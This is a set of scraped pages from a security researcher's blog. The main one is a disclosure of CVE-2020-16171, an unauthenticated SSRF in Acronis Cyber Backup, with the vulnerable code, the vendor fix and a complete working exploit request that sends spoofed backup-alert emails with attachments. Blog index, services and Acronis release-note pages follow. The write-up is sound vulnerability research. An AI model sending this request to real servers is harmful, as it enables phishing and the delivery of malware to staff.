=== Content from www.rcesecurity.com_00c6c948_20250119_142505.html ===


[![RCE Security](https://www.rcesecurity.com/wp-content/uploads/2024/03/logo_small.png)](https://www.rcesecurity.com/)

* [Home](https://www.rcesecurity.com/)
* [About](https://www.rcesecurity.com/about/)
* [Services](https://www.rcesecurity.com/consulting-services/)
* [Research](https://www.rcesecurity.com/blog/)
* [Contact Us](https://www.rcesecurity.com/contact/)

Select Page

# CVE-2020-16171: Exploiting Acronis Cyber Backup for Fun and Emails

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, September 14, 2020 | [Advisory](https://www.rcesecurity.com/category/advisory/), [CVE](https://www.rcesecurity.com/category/cve/) | [0 comments](https://www.rcesecurity.com/2020/09/cve-2020-16171-exploiting-acronis-cyber-backup-for-fun-and-emails/#respond)

You have probably read one or more blog posts about SSRFs, many being escalated to RCE. While this might be the ultimate goal, this post is about an often overlooked impact of SSRFs: application logic impact.

This post will tell you the story about an unauthenticated SSRF affecting [Acronis Cyber Backup up to v12.5 Build 16341](https://dl.acronis.com/u/backup/rn/12.5/user/en-US/AcronisBackup12.5_relnotes.htm), which allows sending fully customizable emails to any recipient by abusing a web service that is bound to localhost. The fun thing about this issue is that the emails can be sent as backup indicators, including fully customizable attachments. Imagine sending Acronis ‚ÄúBackup Failed‚Äù emails to the whole organization with a nice backdoor attached to it? Here you go.

## Root Cause Analysis

So Acronis Cyber Backup is essentially a backup solution that offers administrators a powerful way to automatically backup connected systems such as clients and even servers. The solution itself consists of dozens of internally connected (web) services and functionalities, so it‚Äôs essentially a mess of different C/C++, Go, and Python applications and libraries.

The application‚Äôs main web service runs on port 9877 and presents you with a login screen:

![](/wp-content/uploads/2022/10/CVE-2020-16171-1.png)

Now, every hacker‚Äôs goal is to find something unauthenticated. Something cool. So I‚Äôve started to dig into the source code of the main web service to find something cool. Actually, it didn‚Äôt take me too long to discover that something in a method called `make_request_to_ams`:

```
# WebServer/wcs/web/temp_ams_proxy.py:

def make_request_to_ams(resource, method, data=None):
    port = config.CONFIG.get('default_ams_port', '9892')
    uri = 'http://{}:{}{}'.format(get_ams_address(request.headers), port, resource)
[...]

```

The main interesting thing here is the call to `et_ams_address(request.headers)`, which is used to construct a Uri. The application reads out a specific request header called `Shard` within that method:

```
def get_ams_address(headers):
    if 'Shard' in headers:
        logging.debug('Get_ams_address address from shard ams_host=%s', headers.get('Shard'))
        return headers.get('Shard')  # Mobile agent >= ABC5.0

```

When having a further look at the `make_request_to_ams` call, things are getting pretty clear. The application uses the value from the `Shard header in a urllib.request.urlopen` call:

```
def make_request_to_ams(resource, method, data=None):
[...]
    logging.debug('Making request to AMS %s %s', method, uri)
    headers = dict(request.headers)
    del headers['Content-Length']
    if not data is None:
        headers['Content-Type'] = 'application/json'
    req = urllib.request.Request(uri,
                                 headers=headers,
                                 method=method,
                                 data=data)
    resp = None
    try:
        resp = urllib.request.urlopen(req, timeout=wcs.web.session.DEFAULT_REQUEST_TIMEOUT)
    except Exception as e:
        logging.error('Cannot access ams {} {}, error: {}'.format(method, resource, e))
    return resp

```

So this is a pretty straight-forward SSRF including a couple of bonus points making the SSRF even more powerful:

* The instantiation of the `urllib.request.Request` class uses all original request headers, the HTTP method from the
  request, and the even the whole request body.
* The response is fully returned!

The only thing that needs to be bypassed is the hardcoded construction of the destination Uri since the API appends a semicolon, a port, and a resource to the requested Uri:

```
uri = 'http://{}:{}{}'.format(get_ams_address(request.headers), port, resource)

```

However, this is also trivially easy to bypass since you only need to append a `?` to turn those into parameters. A final payload for the Shard header, therefore, looks like the following:

```
Shard: localhost?

```
## Finding Unauthenticated Routes

To exploit this SSRF we need to find a route which is reachable without authentication. While most of CyberBackup‚Äôs routes are only reachable with authentication, there is one interesting route called `/api/ams/agents` which is kinda different:

```
# WebServer/wcs/web/temp_ams_proxy.py:
_AMS_ADD_DEVICES_ROUTES = [
    (['POST'], '/api/ams/agents'),
] + AMS_PUBLIC_ROUTES

```

Every request to this route is passed to the `route_add_devices_request_to_ams` method:

```
def setup_ams_routes(app):
[...]
    for methods, uri, *dummy in _AMS_ADD_DEVICES_ROUTES:
        app.add_url_rule(uri,
                         methods=methods,
                         view_func=_route_add_devices_request_to_ams)
[...]

```

This in return does only check whether the `allow_add_devices` configuration is enabled (which is the standard config) before passing the request to the vulnerable `_route_the_request_to_ams` method:

```

def _route_add_devices_request_to_ams(*dummy_args, **dummy_kwargs):
    if not config.CONFIG.get('allow_add_devices', True):
        raise exceptions.operation_forbidden_error('Add devices')

    return _route_the_request_to_ams(*dummy_args, **dummy_kwargs)

```

So we‚Äôve found our attackable route without authentication here.

## Sending Fully Customized Emails Including An Attachment

Apart from doing meta-data stuff or similar, I wanted to entirely fire the SSRF against one of Cyber Backup‚Äôs internal web services. There are many these, and there are a whole bunch of web services whose authorization concept solely relies only on being callable from the localhost. Sounds like a weak spot, right?

One interesting internal web service is listening on `localhost port 30572: the Notification Service`. This service offers a variety of functionality to send out notifications. One of the provided endpoints is `/external_email/`:

```
@route(r'^/external_email/?')
class ExternalEmailHandler(RESTHandler):
    @schematic_request(input=ExternalEmailValidator(), deserialize=True)
    async def post(self):
        try:
            error = await send_external_email(
                self.json['tenantId'], self.json['eventLevel'], self.json['template'], self.json['parameters'],
                self.json.get('images', {}), self.json.get('attachments', {}), self.json.get('mainRecipients', []),
                self.json.get('additionalRecipients', [])
            )
            if error:
                raise HTTPError(http.BAD_REQUEST, reason=error.replace('\n', ''))
        except RuntimeError as e:
            raise HTTPError(http.BAD_REQUEST, reason=str(e))

```

I‚Äôm not going through the `send_external_email` method in detail since it is rather complex, but this endpoint essentially uses parameters supplied via HTTP POST to construct an email that is send out afterwards.

The final working exploit looks like the following:

```
POST /api/ams/agents HTTP/1.1
Host: 10.211.55.10:9877
Shard: localhost:30572/external_email?
Connection: close
Content-Length: 719
Content-Type: application/json;charset=UTF-8

{"tenantId":"00000000-0000-0000-0000-000000000000",
"template":"true_image_backup",
"parameters":{
"what_to_backup":"what_to_backup",
"duration":2,
"timezone":1,
"start_time":1,
"finish_time":1,
"backup_size":1,
"quota_servers":1,
"usage_vms":1,
"quota_vms":1,"subject_status":"subject_status",
"machine_name":"machine_name",
"plan_name":"plan_name",
"subject_hierarchy_name":"subject_hierarchy_name",
"subject_login":"subject_login",
"ams_machine_name":"ams_machine_name",
"machine_name":"machine_name",
"status":"status","support_url":"support_url"
},
"images":{"test":"./critical-alert.png"},
"attachments":{"test.html":"PHU+U29tZSBtb3JlIGZ1biBoZXJlPC91Pg=="},
"mainRecipients":["[[email¬†protected]](/cdn-cgi/l/email-protection)"]}

```

This involves a variety of ‚Äúcustomizations‚Äù for the email including a base64-encoded `attachments` value. Issuing this POST request returns `null`:

![](/wp-content/uploads/2022/10/CVE-2020-16171-2.png)

but ultimately sends out the email to the given `mainRecipients including some attachments`:

![](/wp-content/uploads/2022/10/CVE-2020-16171-3.png)

Perfectly spoofed mail, right üòâ ?

## The Fix

Acronis fixed the vulnerability in version `v12.5 Build 16342 of Acronis Cyber Backup by changing the way that get_ams_address` gets the actual `Shard` address. It now requires an additional authorization header with a JWT that is passed to a method called `resolve_shard_address`:

```
# WebServer/wcs/web/temp_ams_proxy.py:
def get_ams_address(headers):
    if config.is_msp_environment():
        auth = headers.get('Authorization')
        _bearer_prefix = 'bearer '
        _bearer_prefix_len = len(_bearer_prefix)
        jwt = auth[_bearer_prefix_len:]
        tenant_id = headers.get('X-Apigw-Tenant-Id')
        logging.info('GET_AMS: tenant_id: {}, jwt: {}'.format(tenant_id, jwt))
        if tenant_id and jwt:
            return wcs.web.session.resolve_shard_address(jwt, tenant_id)

```

While both values `tenant_id and jwt` are not explicitly validated here, they are simply used in a new hardcoded call to the API endpoint `/api/account_server/tenants/` which ultimately verifies the authorization:

```
# WebServer/wcs/web/session.py:
def resolve_shard_address(jwt, tenant_id):
    backup_account_server = config.CONFIG['default_backup_account_server']
    url = '{}/api/account_server/tenants/{}'.format(backup_account_server, tenant_id)

    headers = {
        'Authorization': 'Bearer {}'.format(jwt)
    }

    from wcs.web.proxy import make_request
    result = make_request(url,
                          logging.getLogger(),
                          method='GET',
                          headers=headers).json()
    kind = result['kind']
    if kind not in ['unit', 'customer']:
        raise exceptions.unsupported_tenant_kind(kind)
    return result['ams_shard']

```

Problem solved.

* [X](https://twitter.com/MrTuxracer)
* [RSS](https://www.rcesecurity.com/feed/)

Designed by [Elegant Themes](https://www.elegantthemes.com "Premium WordPress Themes") | Powered by [WordPress](https://www.wordpress.org)



=== Content from www.rcesecurity.com_b05695bb_20250119_142502.html ===


[![RCE Security](https://www.rcesecurity.com/wp-content/uploads/2024/03/logo_small.png)](https://www.rcesecurity.com/)

* [Home](https://www.rcesecurity.com/)
* [About](https://www.rcesecurity.com/about/)
* [Services](https://www.rcesecurity.com/consulting-services/)
* [Research](https://www.rcesecurity.com/blog/)
* [Contact Us](https://www.rcesecurity.com/contact/)

Select Page

[![WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/wp-content/uploads/2024/08/cve-2024-5932-0.png)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)
## [WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, August 26, 2024 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

A few days ago, Wordfence published a blog post about a PHP Object Injection vulnerability affecting the popular WordPress Plugin GiveWP in all versions <= 3.14.1. Since the blog post contains only information about (a part) of the POP chain used, I decided to take a look and build a fully functional Remote Code Execution exploit. This post describes how I approached the process, identifying the missing parts and building the entire POP chain.

[![Patch Diffing CVE-2023-28121 to Compromise a WooCommerce](https://www.rcesecurity.com/wp-content/uploads/2023/07/woocommerce-payments-auth-bypass-4.png)](https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/)
## [Patch Diffing CVE-2023-28121 to Compromise a WooCommerce](https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, July 3, 2023 | [Exploit](https://www.rcesecurity.com/category/exploit/), [Patch Diffing](https://www.rcesecurity.com/category/patch-diffing/)

Back in March 2023, I noticed an interesting security advisory that was published by Wordfence about a critical ‚ÄúAuthentication Bypass and Privilege Escalation‚Äù (aka CVE-2023-28121) affecting the ‚ÄúWooCommerce Payments‚Äù plugin which has more...

[![SecurePwn Part 2: Leaking Remote Memory Contents (CVE-2023-22897)](https://www.rcesecurity.com/wp-content/uploads/2023/04/securepwn-10.png)](https://www.rcesecurity.com/2023/04/securepwn-part-2-leaking-remote-memory-contents-cve-2023-22897/)
## [SecurePwn Part 2: Leaking Remote Memory Contents (CVE-2023-22897)](https://www.rcesecurity.com/2023/04/securepwn-part-2-leaking-remote-memory-contents-cve-2023-22897/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Wednesday, April 12, 2023 | [Advisory](https://www.rcesecurity.com/category/advisory/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

While my last finding affecting SecurePoint‚Äôs UTM was quite interesting already, I was hit by a really hard OpenSSL Heartbleed flashback with this one. The following exploit works against both the admin portal on port 11115 as well as the user portal on port...

[![SecurePwn Part 1: Bypassing SecurePoint UTM‚Äôs Authentication (CVE-2023-22620)](https://www.rcesecurity.com/wp-content/uploads/2023/01/securepwn-1.png)](https://www.rcesecurity.com/2023/04/securepwn-part-1-bypassing-securepoint-utms-authentication-cve-2023-22620/)
## [SecurePwn Part 1: Bypassing SecurePoint UTM‚Äôs Authentication (CVE-2023-22620)](https://www.rcesecurity.com/2023/04/securepwn-part-1-bypassing-securepoint-utms-authentication-cve-2023-22620/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Tuesday, April 11, 2023 | [Advisory](https://www.rcesecurity.com/category/advisory/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

While working on a recent customer engagement, I discovered two fascinating and somewhat weird bugs in SecurePoint‚Äôs UTM firewall solution. The first one, aka CVE-2023-22620, is rated critical for an attacker to bypass the entire authentication and gain access...

[![From Zero to Hero Part 2: From SQL Injection to RCE on Intel DCM (CVE-2022-21225)](https://www.rcesecurity.com/wp-content/uploads/2022/12/dcm-sqli-9.png)](https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/)
## [From Zero to Hero Part 2: From SQL Injection to RCE on Intel DCM (CVE-2022-21225)](https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Thursday, December 1, 2022 | [Advisory](https://www.rcesecurity.com/category/advisory/), [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/)

[¬´ Older Entries](https://www.rcesecurity.com/author/mrtux/page/2/)

* [X](https://twitter.com/MrTuxracer)
* [RSS](https://www.rcesecurity.com/feed/)

Designed by [Elegant Themes](https://www.elegantthemes.com "Premium WordPress Themes") | Powered by [WordPress](https://www.wordpress.org)



=== Content from www.rcesecurity.com_e3f9f927_20250119_142500.html ===


[![RCE Security](https://www.rcesecurity.com/wp-content/uploads/2024/03/logo_small.png)](https://www.rcesecurity.com/)

* [Home](https://www.rcesecurity.com/)
* [About](https://www.rcesecurity.com/about/)
* [Services](https://www.rcesecurity.com/consulting-services/)
* [Research](https://www.rcesecurity.com/blog/)
* [Contact Us](https://www.rcesecurity.com/contact/)

Select Page

# Services

We‚Äôre currently offering the following consulting services:

## Penetration Tests

A penetration test, or pen test, is a security assessment that involves simulating attacks on a computer system, network, or application. We attempt to identify vulnerabilities and weaknesses in the target system by using the same techniques and tools as potential malicious actors. The objective is to uncover and address security risks before they can be exploited, helping organizations enhance their cybersecurity defenses and protect against real threats. Penetration tests are a proactive measure to ensure the robustness of digital assets and data security.

We perform penetration tests against all kinds of targets:

* Web applications with any tech stack
* Web service APIs ‚Äì i.e., GraphQl, Rest, SOAP
* Android mobile apps
* iOS mobile apps

## Bug Bounty Services

Empower your organization‚Äôs cybersecurity with a tailored Bug Bounty Program. Take control of your digital defense by engaging a community of ethical hackers to proactively identify vulnerabilities. Running your own Bug Bounty Program enhances your security posture and demonstrates a commitment to staying ahead in the ever-evolving landscape of cyber threats.

Do you want to run your own vulnerability disclosure or bug bounty program? Or do you already operate one but are not happy with how it is managed? Do you want to have independent triage?

What we do:

* Setting up vulnerability disclosure and bug bounty programs
* Managing new and existing programs
* Triaging incoming bug bounty reports

## Source Code Reviews

A security source code review, also known as a code audit or static code analysis, is a meticulous examination of the software‚Äôs source code to identify and rectify security vulnerabilities and flaws. This in-depth analysis is crucial for ensuring that software applications are robust and resistant to potential cyber threats, as it enables developers and security experts to spot and mitigate security issues before they can be exploited by malicious actors.

We perform source code reviews of applications based on the following languages:

* Java
* PHP
* .NET

## Attack Surface Management

Attack Surface Management is a security practice focused on identifying, monitoring, and reducing digital vulnerabilities and potential points of attack within an organization‚Äôs IT environment. It involves a comprehensive assessment of the organization‚Äôs assets, including applications, networks, and data, to determine where and how malicious actors might exploit weaknesses. By actively managing and minimizing the attack surface, organizations can strengthen their security posture, reduce risks, and safeguard their systems and data from potential cyber threats.

What we do:

* Continuous monitoring of any of your assets, including mobile apps.

## Interested in getting hacked?

Leave me a message at¬†**info [a.t] rcesecurity [d.o.t] com** or use the [contact form](https://www.rcesecurity.com/contact/).

## Past Customers and Projects

* `Big international airline`¬†‚Äì Performed penetration test against internet-facing assets
* `Big German DSL/cable modem manufacturer`¬†‚Äì Performed penetration test against hardware devices
* `Big German domain registrar`¬†‚Äì Performed penetration test against newly developed web api
* `Big German insurance company`¬†‚Äì White-box security configuration review
* `Big German transportation company`¬†‚Äì Performed penetration tests against new web functionality
* `Mid-sized German ridesharing company`¬†‚Äì Performed penetration test against all web assets
* `Mid-sized German cargo company`¬†‚Äì Performed firewall configuration analysis and maintenance
* `Mid-sized German animal food wholesaler`¬†‚Äì Secured email infrastructure via configuration review
* `Mid-sized German banking tool vendor`¬†‚Äì Performed penetration test against Windows thick client
* `Mid-sized German bank`¬†‚Äì Performed penetration test against customer-facing web application and API
* `Small-sized German dog food shop`¬†‚Äì Performed security hardening of an online shop

* [X](https://twitter.com/MrTuxracer)
* [RSS](https://www.rcesecurity.com/feed/)

Designed by [Elegant Themes](https://www.elegantthemes.com "Premium WordPress Themes") | Powered by [WordPress](https://www.wordpress.org)



=== Content from www.rcesecurity.com_b0be937b_20250119_142500.html ===


[![RCE Security](https://www.rcesecurity.com/wp-content/uploads/2024/03/logo_small.png)](https://www.rcesecurity.com/)

* [Home](https://www.rcesecurity.com/)
* [About](https://www.rcesecurity.com/about/)
* [Services](https://www.rcesecurity.com/consulting-services/)
* [Research](https://www.rcesecurity.com/blog/)
* [Contact Us](https://www.rcesecurity.com/contact/)

Select Page

[![WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/wp-content/uploads/2024/08/cve-2024-5932-0.png)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)
## [WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, August 26, 2024 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

A few days ago, Wordfence published a blog post about a PHP Object Injection vulnerability affecting the popular WordPress Plugin GiveWP in all versions <= 3.14.1. Since the blog post contains only information about (a part) of the POP chain used, I decided to take a look and build a fully functional Remote Code Execution exploit. This post describes how I approached the process, identifying the missing parts and building the entire POP chain.

[![Patch Diffing CVE-2023-28121 to Compromise a WooCommerce](https://www.rcesecurity.com/wp-content/uploads/2023/07/woocommerce-payments-auth-bypass-4.png)](https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/)
## [Patch Diffing CVE-2023-28121 to Compromise a WooCommerce](https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, July 3, 2023 | [Exploit](https://www.rcesecurity.com/category/exploit/), [Patch Diffing](https://www.rcesecurity.com/category/patch-diffing/)

Back in March 2023, I noticed an interesting security advisory that was published by Wordfence about a critical ‚ÄúAuthentication Bypass and Privilege Escalation‚Äù (aka CVE-2023-28121) affecting the ‚ÄúWooCommerce Payments‚Äù plugin which has more...

[![SecurePwn Part 2: Leaking Remote Memory Contents (CVE-2023-22897)](https://www.rcesecurity.com/wp-content/uploads/2023/04/securepwn-10.png)](https://www.rcesecurity.com/2023/04/securepwn-part-2-leaking-remote-memory-contents-cve-2023-22897/)
## [SecurePwn Part 2: Leaking Remote Memory Contents (CVE-2023-22897)](https://www.rcesecurity.com/2023/04/securepwn-part-2-leaking-remote-memory-contents-cve-2023-22897/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Wednesday, April 12, 2023 | [Advisory](https://www.rcesecurity.com/category/advisory/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

While my last finding affecting SecurePoint‚Äôs UTM was quite interesting already, I was hit by a really hard OpenSSL Heartbleed flashback with this one. The following exploit works against both the admin portal on port 11115 as well as the user portal on port...

[![SecurePwn Part 1: Bypassing SecurePoint UTM‚Äôs Authentication (CVE-2023-22620)](https://www.rcesecurity.com/wp-content/uploads/2023/01/securepwn-1.png)](https://www.rcesecurity.com/2023/04/securepwn-part-1-bypassing-securepoint-utms-authentication-cve-2023-22620/)
## [SecurePwn Part 1: Bypassing SecurePoint UTM‚Äôs Authentication (CVE-2023-22620)](https://www.rcesecurity.com/2023/04/securepwn-part-1-bypassing-securepoint-utms-authentication-cve-2023-22620/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Tuesday, April 11, 2023 | [Advisory](https://www.rcesecurity.com/category/advisory/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

While working on a recent customer engagement, I discovered two fascinating and somewhat weird bugs in SecurePoint‚Äôs UTM firewall solution. The first one, aka CVE-2023-22620, is rated critical for an attacker to bypass the entire authentication and gain access...

[![From Zero to Hero Part 2: From SQL Injection to RCE on Intel DCM (CVE-2022-21225)](https://www.rcesecurity.com/wp-content/uploads/2022/12/dcm-sqli-9.png)](https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/)
## [From Zero to Hero Part 2: From SQL Injection to RCE on Intel DCM (CVE-2022-21225)](https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Thursday, December 1, 2022 | [Advisory](https://www.rcesecurity.com/category/advisory/), [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/)

[![From Zero to Hero Part 1: Bypassing Intel DCM‚Äôs Authentication by Spoofing Kerberos and LDAP Responses (CVE-2022-33942)](https://www.rcesecurity.com/wp-content/uploads/2022/11/dcm-auth-bypass-3.png)](https://www.rcesecurity.com/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/)
## [From Zero to Hero Part 1: Bypassing Intel DCM‚Äôs Authentication by Spoofing Kerberos and LDAP Responses (CVE-2022-33942)](https://www.rcesecurity.com/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Wednesday, November 23, 2022 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/)

This small series of two blog posts covers an entire vulnerability chain to go from unauthenticated user to full remote code execution against Intel‚Äôs Data Center Manager (up to version 4.1.1.45749).The chain‚Äôs first vulnerability bypasses DCM‚Äôs entire authentication process.

[![WordPress Transposh: Exploiting a Blind SQL Injection via XSS](https://www.rcesecurity.com/wp-content/uploads/2022/10/transposh-chain-6.png)](https://www.rcesecurity.com/2022/07/wordpress-transposh-exploiting-a-blind-sql-injection-via-xss/)
## [WordPress Transposh: Exploiting a Blind SQL Injection via XSS](https://www.rcesecurity.com/2022/07/wordpress-transposh-exploiting-a-blind-sql-injection-via-xss/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Friday, July 22, 2022 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/)

Introduction You probably have read about my recent swamp of CVEs affecting a WordPress plugin called Transposh Translation Filter, which resulted in more than $30,000 in bounties: [CVE-2021-24910] Transposh <= 1.0.7 ‚Äútp\_tp‚Äù Unauthenticated Reflected Cross-Site...

[![AWAE Course and OSWE Exam Review](https://www.rcesecurity.com/wp-content/uploads/2022/10/oswe.png)](https://www.rcesecurity.com/2022/04/awae-course-and-oswe-exam-review/)
## [AWAE Course and OSWE Exam Review](https://www.rcesecurity.com/2022/04/awae-course-and-oswe-exam-review/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Friday, April 22, 2022 | [Certifications](https://www.rcesecurity.com/category/certifications/)

Introduction This is a review of the Advanced Web Attacks and Exploitation (WEB-300) course and its OSWE exam by Offensive-Security. I‚Äôve taken this course because I was curious about what secret tricks this course will offer for its money, especially...

[![Smuggling an (Un)exploitable XSS](https://www.rcesecurity.com/wp-content/uploads/2022/10/smug-202010-1.png)](https://www.rcesecurity.com/2020/11/smuggling-an-un-exploitable-xss/)
## [Smuggling an (Un)exploitable XSS](https://www.rcesecurity.com/2020/11/smuggling-an-un-exploitable-xss/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Friday, November 13, 2020 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/)

This is the story about how I‚Äôve chained a seemingly uninteresting request smuggling vulnerability with an even more uninteresting header-based XSS to redirect network-internal web site users without any user interaction to arbitrary pages. This post also...

[![CVE-2020-16171: Exploiting Acronis Cyber Backup for Fun and Emails](https://www.rcesecurity.com/wp-content/uploads/2022/10/CVE-2020-16171-1.png)](https://www.rcesecurity.com/2020/09/cve-2020-16171-exploiting-acronis-cyber-backup-for-fun-and-emails/)
## [CVE-2020-16171: Exploiting Acronis Cyber Backup for Fun and Emails](https://www.rcesecurity.com/2020/09/cve-2020-16171-exploiting-acronis-cyber-backup-for-fun-and-emails/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, September 14, 2020 | [Advisory](https://www.rcesecurity.com/category/advisory/), [CVE](https://www.rcesecurity.com/category/cve/)

You have probably read one or more blog posts about SSRFs, many being escalated to RCE. While this might be the ultimate goal, this post is about an often overlooked impact of SSRFs: application logic impact. This post will tell you the story about an unauthenticated...

[¬´ Older Entries](https://www.rcesecurity.com/blog/page/2/)

* [X](https://twitter.com/MrTuxracer)
* [RSS](https://www.rcesecurity.com/feed/)

Designed by [Elegant Themes](https://www.elegantthemes.com "Premium WordPress Themes") | Powered by [WordPress](https://www.wordpress.org)



=== Content from dl.acronis.com_b5a9b44b_20250119_142503.html ===

![Acronis](data:image/png;base64...) Cyber Backup 12.5

# Release Notes

Release date: March 26, 2021
Build: 16428

## Table of contents

* [Overview](#Overview)
* [What's new in Update 6](#What's)
* [What's new in Update 5](#What's2)
* [What's new in Update 4](#What's3)
* [What's new in Update 3.2](#What's4)
* [What's new in Update 3.1](#What's5)
* [What's new in Update 3](#What's6)
* [What's new in Update 2](#What's7)
* [What's new in Update 1](#What's8)
* [What's new in Acronis Backup](#What's9)
* [Known issues](#Known)

## Overview

We are happy to introduce Acronis Cyber Backup 12.5 √¢¬Ä¬ì the most secure backup solution on the market, capable of protecting 20+ platforms no matter the size or location √¢¬Ä¬ì on-premises, in remote systems, in private and public clouds, and on mobile devices. It ensures business uptime by spinning up backup on a virtual machine or by restoring an entire system to new, dissimilar hardware, overcoming compatibility issues. Acronis Cyber Backup provides flexible storage options: NAS, SAN, tapes, disks, Acronis Cloud, or any private or public cloud, such as Azure, AWS, or Google. Its proprietary AI- and ML-based technology features proactively prevent cyber attacks, stop questionable behavior, and automatically recover damaged files. Its intuitive, web-based management console provides full oversight on the backup management tasks and monitoring in 25 languages.

Acronis Cyber Backup 12.5 is available in two editions: Acronis Cyber Backup 12.5 Standard and Acronis Cyber Backup 12.5 Advanced.

## What's new in Update 6

### VMware vSphere 7.0 support

* Agentless backup and recovery of virtual machines running on VMware vSphere 7.0 is fully supported.
* VMware vSAN 7.0 is fully supported.
* Limitations in Acronis Cyber Backup 12.5 Update 6 release:
  + √¢¬Ä¬úESXi configuration√¢¬Ä¬ù backup is not supported.
  + (Same as for vSphere 6.7) Virtualization Based Security (VBS) option is always disabled on restored virtual machine.
  + (Same as for vSphere 6.7) Trusted Platform Module (TPM) is absent on restored virtual machine.
  + (Same as for vSphere 6.7) VMware vSphere configurations with PMEM datastores are not supported.

## Issues fixed in Update 6 (build: 16428)

This section describes issues that have been fixed in Update 6.

### Issues fixed in build 16428 (March 26, 2021)

#### Common

* [PLTFRM-26834] Security: jQuery version 1.10.1 update to version 3.5.0 is required to fix known security issues.
* [PLTFRM-19584] Security: potential password leak in "AccountServer" component with enabled debug logging.
* [ARC-295] Service\_process.exe may crash when applying retention rules to an archive on Windows Server 2019 in rare cases.
* [ABR-310754] Agent for VMware (Virtual Appliance), Bootable Media: Service\_process.exe may crash when accessing the backup location on network share accessible by both NFS and SMB protocols, due to NFS browsing enabled in kernel parameters.
* [ABR-306339] Scheduled "Backup replication" plan does not work after disabling and changing its schedule and re-enabling it back.

#### Roles and units management

* [PLTFRM-15297] Adding a user to Unit/Organization Administrators list fails if the domain user is not specified in "Domain\Username" format.

#### Tape management

* [ABR-305775] Recovery from a password-protected archive stored on tape does not work in some cases.

## What's new in Update 5

### Installation

* [Windows only] An installation package that includes both 32-bit and 64-bit installation files (more than 3 GB in size) is now available.
* It is now possible to generate .mst file on the machine where an agent is already installed.

### Support for new operating systems

* Support for macOS 10.15 Catalina
* Support for Ubuntu 19.04, 19.10, and 20.04
* Support for CentOS 8.1
* Support for Oracle Linux 8.1
* Support for CloudLinux 7.7
* Support for ClearOS 7.6

## Issues fixed in Update 5 (builds: 16180 - 16386)

This section describes issues that have been fixed in Update 5.

### Issues fixed in build 16386 (December 4, 2020)

#### Common

* [KERNEL-7378] BSOD caused by Acronis snapman.sys driver on Windows Server 2016.
* [KERNEL-6879] BSOD caused by Acronis snapman.sys driver on Windows Server 2012.
* [ABR-299482] Recovery operation which requires system reboot fails on CentOS 5.9.
